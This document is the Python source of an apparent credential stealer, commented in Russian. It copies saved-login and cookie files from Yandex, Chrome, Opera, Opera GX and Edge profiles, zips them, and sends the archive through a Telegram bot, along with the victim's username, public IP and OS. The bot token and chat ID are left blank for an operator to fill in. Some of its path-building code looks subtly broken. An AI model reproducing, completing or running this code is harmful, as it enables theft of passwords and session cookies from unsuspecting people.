# -------------------------
# --- created by 1wtsyd ---
# -------------------------

import datetime
import platform
import shutil
import os
import socket
import tempfile
import requests
from zipfile import ZipFile
import telebot

TOKEN = ""  # Здесь ваш токен.
ID = ""  # Ваш айди.

bot = telebot.TeleBot(token=TOKEN)


def get_ip():  # Получение IP
    try:
        response = requests.get('https://api.ipify.org/')
        return response.text
    except requests.exceptions.RequestException:
        return None


def send_file(file_path: str):
    bot.send_message(chat_id=ID, text=
    "—————————————————————————————\n"
    + f" Имя: {os.getlogin()}\n"
    + f" IP:  `{get_ip()}`\n"
    + f" Ос:  `{platform.platform()}`\n"
    + "—————————————————————————————", parse_mode="Markdown")
    bot.send_document(ID, open(file_path, "rb"))  # Отправка файла.


def check_internet():  # Проверка подключения к интернету
    try:
        socket.create_connection(("api.telegram.org", 443))
    except socket.error:
        exit()


check_internet()
temp_dir = tempfile.mkdtemp()
os.mkdir(os.path.join(temp_dir, "report"))
username = os.getlogin()


# Получение куки и паролей с браузеров
def copy_file(src_path, dst_path):
    if os.path.exists(src_path):
        shutil.copyfile(src_path, dst_path)


def copy_browser_data(src_folder, dst_folder, browser_name):
    src_path = os.path.join(src_folder, browser_name)
    dst_path = os.path.join(dst_folder, browser_name)
    copy_file(os.path.join(src_path, "Login Data"), os.path.join(dst_path, "Login Data"))
    copy_file(os.path.join(src_path, "Network", "Cookies"), os.path.join(dst_path, "Cookies"))


def copy_browsers_data():
    report_dir = os.path.join(temp_dir, "report")

    # Яндекс Браузер
    yandex_browser_folder = f'C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default'
    if os.path.exists(yandex_browser_folder):
        os.mkdir(os.path.join(report_dir, "Yandex"))
        copy_browser_data(yandex_browser_folder, os.path.join(report_dir, "Yandex"), "Ya Passman Data")

    # Google Chrome
    chrome_folder = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
    if os.path.exists(chrome_folder):
        os.mkdir(os.path.join(report_dir, "Chrome"))
        copy_browser_data(chrome_folder, os.path.join(report_dir, "Chrome"), "Login Data")

    # Opera GX
    opera_gx_folder = f'C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable'
    if os.path.exists(opera_gx_folder):
        os.mkdir(os.path.join(report_dir, "OperaGX"))
        copy_browser_data(opera_gx_folder, os.path.join(report_dir, "OperaGX"), "Login Data")

    # Opera
    opera_folder = f'C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable'
    if os.path.exists(opera_folder):
        os.mkdir(os.path.join(report_dir, "Opera"))
        copy_browser_data(opera_folder, os.path.join(report_dir, "Opera"), "Login Data")

    # Microsoft Edge
    edge_folder = f'C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default'
    if os.path.exists(edge_folder):
        os.mkdir(os.path.join(report_dir, "MicrosoftEdge"))
        copy_browser_data(edge_folder, os.path.join(report_dir, "MicrosoftEdge"), "Login Data")


copy_browsers_data()

# Отправка архива
time_upload = datetime.datetime.now().strftime("%H%M%S")
arc_name = f"VV[{username}--{time_upload}].zip"
with ZipFile(arc_name, "w") as zipfile:
    for root, dirs, files in os.walk(os.path.join(temp_dir, "report")):
        zipfile.write(root)
        for file in files:
            zipfile.write(os.path.join(root, file))
shutil.rmtree(temp_dir)  # Удаляем временную папку

if __name__ == '__main__':
    send_file(arc_name)
    os.remove(arc_name)
